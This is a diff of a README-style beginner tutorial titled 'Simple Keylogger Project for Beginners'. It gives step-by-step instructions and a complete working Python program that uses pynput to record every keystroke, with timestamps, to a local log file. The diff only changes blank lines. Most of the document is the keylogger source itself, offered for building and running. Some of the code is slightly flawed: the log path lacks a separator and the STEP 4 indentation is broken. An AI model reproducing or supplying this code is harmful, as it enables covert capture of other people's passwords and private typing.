@@ -4,28 +4,29 @@ Simple Keylogger Project for Beginners.
 STEP 1 : First Install the pynput library using the [pip install pynput] command.
 
 STEP 2 : Now importing the required packages 
+
                                               from pynput.keyboard import Key, Listener
                                               import logging
                                               
 STEP 3 : Now specify the path where log file will be stored. Here log file inculdes all the keystrokes the user in entering after running the program.
+
                                               log_dir = r"E:\courses\Keylogger"
                                               logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
                                                    
 STEP 4 : Now in the last step create Listner instance and define the on_press() in it and join it with the main program.
+
                                               with Listener(on_press=on_press) as listener:
                                               listener.join()
                                               
 The Final Program should look like this :-> 
+
                                             import pynput
                                             from pynput.keyboard import Key, Listener
                                             import logging
-
                                             log_dir = r"E:\courses\Keylogger"
                                             logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
                                             def on_press(key):
                                                logging.info(str(key))
-
                                             with Listener(on_press=on_press) as listener:
                                                 listener.join()
                                                 
